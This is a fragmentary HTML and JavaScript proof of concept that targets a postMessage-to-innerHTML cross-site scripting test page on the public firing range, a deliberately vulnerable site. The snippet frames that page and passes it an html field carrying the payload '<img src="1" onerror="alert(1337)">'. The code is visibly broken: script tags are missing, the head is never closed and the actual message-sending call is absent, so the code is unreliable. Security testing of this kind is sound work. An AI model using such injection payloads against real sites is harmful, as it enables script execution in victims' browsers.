<head>

<body>
  <iframe id="frame" src="https://public-firing-range.appspot.com/dom/toxicdom/postMessage/innerHtml" frameborder="0"></iframe>

    const frame = document.querySelector("#frame");
    frame.onload = () => {

        html: '<img src="1" onerror="alert(1337)">'
